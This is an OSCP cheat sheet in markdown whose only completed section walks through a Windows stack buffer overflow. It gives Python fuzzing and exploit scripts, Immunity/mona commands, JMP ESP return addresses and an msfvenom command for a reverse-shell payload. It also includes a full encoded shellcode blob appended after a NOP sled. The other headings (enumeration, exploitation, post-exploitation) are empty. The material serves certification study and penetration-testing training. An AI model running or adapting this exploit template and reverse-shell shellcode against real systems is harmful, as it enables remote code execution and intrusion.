# OSCP_cheatsheet

# Summary
* [General](#General)
* [Buffer Overflow](#Buffer_Overflow)
* [Enumeration](#Enumeration)
* [Exploitation](#Exploitation)
* [Post_Exploitation](#Post_Exploitation)
    * [Local privilege escalation](#Local-privilege-escalation)
         * [Windows](#Windows)
         * [Linux](#Linux)
    * [Lateral Movement](#Lateral-Movement)
    
# General
#### COMMANDO EXAMPLE
```
<COMMANDO>
```
 
# Buffer overflow
To find and exploit a buffer overflow the following steps should be executed:
   1. **Spiking:** Find the vulnerable parameter
   2. **Fuzzing:** Get the amount of bytes the program crashes
   3. **Find the offset:** Get the amount of bytes to write to the EIP
   4. **Overwriting the EIP**
   5. **Find bad characters:** Run all hex characters through the program
   6. **Finding the right module:** Look for a ddl without memory protections
   7. **Generating shellcode:** To get a reverse shell or to run calc
   
Make sure you got immunity debugger + mona.py installed
   
#### Spiking
1. Take the commands/options/parameters one at a time and send a bunch of data to see if it crashes
2. Use `generic_send_tcp <HOST> <PORT> <SPIKE SCRIPT> 0 0` to send a spike script
```
#EXAMPLE SPIKE SCRIPT
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

#### Fuzzing
1. Get the amount of bytes it crashes the program, the following fuzzing script could be used:

```
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        print "Fuzzing App with %s bytes" % str(len(buffer))
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('<IP>',<PORT>))
                        
        s.send(('<COMMAND>' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    
    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
```

#### Find the offset
1.	Create a offset pattern with the amount of bytes the program crashed.
   Use a couple more tho!

```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>```

```
!mona config -set workingfolder C:\ImmunityLogs\%p
!mona pc <length>
```

2.	Edit the script to add the offset pattern.

```
#!/usr/bin/python
import sys, socket
from time import sleep

offset = ""

buffer = offset

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('<IP>',<PORT>))
    s.send(('<COMMAND>' + buffer))
    s.close()
    
except:
    print "Error connecting to server"
    sys.exit()

```
3.	Send the offset pattern and get the EIP value out of the Immunity Debugger.
4. Get the amount of offset bytes.

```/usr/share/Metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP VALUE>```

```!mona po <EIP VALUE>```

#### Overwriting the EIP
1. Edit the script, remove the offset variable. Then change the buffer to overwrite the buffer with 4 B's

```
buffer = "A" * <OFFSET BYTES> + "B" * 4
```

2. Execute the script and check if the EIP is overwritten with 4 B's (42424242)

#### Find bad characters
1. Get a list of bad characters from https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/ or https://github.com/cytopia/badchars
2. Edit the script. Add an badchars variable and change the buffer to send the bad characters

```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A" * <OFFSET BYTES> + "B" * 4 + badchars
```

3. Execute the script and right click the ESP, select follow in dump and check all the values to see if any character is missing. (Check the hex dump and look for missing/off hex characters)

#### Finding the right module
1. See all the module by executing `!mona modules` in the Immunity Debugger console.
2. Check all the protection settings (Rebase, SafeSEN, ASLR, NXCompat, OS dll)
3. Look for a vulnerable dll with all falses and write down the .dll
4. Find the upcode equivalant of a jump use `nasm_shell.rb`

```
JMP ESP 
output = \xff\xe4
```

5. Get the all the JMP ESP return adressess `!mona find -s “\xff\xe4” -m <.dll file>`
6. Write down all the JMP ESP return adresses
7. Edit the buffer variable in the script with a JMP ESP return adress (Watch out for little andian for Windows) for the location where 4 * B for the EIP was.

```
buffer = "A" * 2003 +  "<RETURN\ESP ADRESS>"
buffer = "A" * 2003 +  "\xaf\x11\x50\x62" #LITTLE ANDIAN EXAMPLE WITH ADRESS 625011af
```

8. Click on the blue arrow in Immunity Debugger and enter the return adress, hit F2 to mark it blue and set a break point. Check the EIP value. If the EIP value == return/ESP adress we control the EIP

#### Generating shellcode
1. Generate shellcode with msfvenom (reverse shell)

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b “<BADCHARS>”
```

2. Add a payload variable to the script in parenthese()
3. Add the payload to the end of the buffer and insert NOPS in-between the return adress and payload

```
payload = (
"\xba\x9f\x88\x46\xeb\xda\xca\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x83\xee\xfc\x03\xc9\x86\xa4\x1e\x09\x7e\xaa"
"\xe1\xf1\x7f\xcb\x68\x14\x4e\xcb\x0f\x5d\xe1\xfb\x44\x33\x0e"
"\x77\x08\xa7\x85\xf5\x85\xc8\x2e\xb3\xf3\xe7\xaf\xe8\xc0\x66"
"\x2c\xf3\x14\x48\x0d\x3c\x69\x89\x4a\x21\x80\xdb\x03\x2d\x37"
"\xcb\x20\x7b\x84\x60\x7a\x6d\x8c\x95\xcb\x8c\xbd\x08\x47\xd7"
"\x1d\xab\x84\x63\x14\xb3\xc9\x4e\xee\x48\x39\x24\xf1\x98\x73"
"\xc5\x5e\xe5\xbb\x34\x9e\x22\x7b\xa7\xd5\x5a\x7f\x5a\xee\x99"
"\xfd\x80\x7b\x39\xa5\x43\xdb\xe5\x57\x87\xba\x6e\x5b\x6c\xc8"
"\x28\x78\x73\x1d\x43\x84\xf8\xa0\x83\x0c\xba\x86\x07\x54\x18"
"\xa6\x1e\x30\xcf\xd7\x40\x9b\xb0\x7d\x0b\x36\xa4\x0f\x56\x5f"
"\x09\x22\x68\x9f\x05\x35\x1b\xad\x8a\xed\xb3\x9d\x43\x28\x44"
"\xe1\x79\x8c\xda\x1c\x82\xed\xf3\xda\xd6\xbd\x6b\xca\x56\x56"
"\x6b\xf3\x82\xf9\x3b\x5b\x7d\xba\xeb\x1b\x2d\x52\xe1\x93\x12"
"\x42\x0a\x7e\x3b\xe9\xf1\xe9\x84\x46\xf9\x6e\x6c\x95\xf9\x71"
"\xd6\x10\x1f\x1b\x38\x75\x88\xb4\xa1\xdc\x42\x24\x2d\xcb\x2f"
"\x66\xa5\xf8\xd0\x29\x4e\x74\xc2\xde\xbe\xc3\xb8\x49\xc0\xf9"
"\xd4\x16\x53\x66\x24\x50\x48\x31\x73\x35\xbe\x48\x11\xab\x99"
"\xe2\x07\x36\x7f\xcc\x83\xed\xbc\xd3\x0a\x63\xf8\xf7\x1c\xbd"
"\x01\xbc\x48\x11\x54\x6a\x26\xd7\x0e\xdc\x90\x81\xfd\xb6\x74"
"\x57\xce\x08\x02\x58\x1b\xff\xea\xe9\xf2\x46\x15\xc5\x92\x4e"
"\x6e\x3b\x03\xb0\xa5\xff\x23\x53\x6f\x0a\xcc\xca\xfa\xb7\x91"
"\xec\xd1\xf4\xaf\x6e\xd3\x84\x4b\x6e\x96\x81\x10\x28\x4b\xf8"
"\x09\xdd\x6b\xaf\x2a\xf4")

buffer = "A" * 2003 + "<RETURN\ESP ADRESS>" + "\x90" * 32  + payload
```
 
# Enumeration
 
# Exploitation
 
# Post Exploitation
 
## Local privilege escalation
### Windows

### Linux
 
## Lateral movement
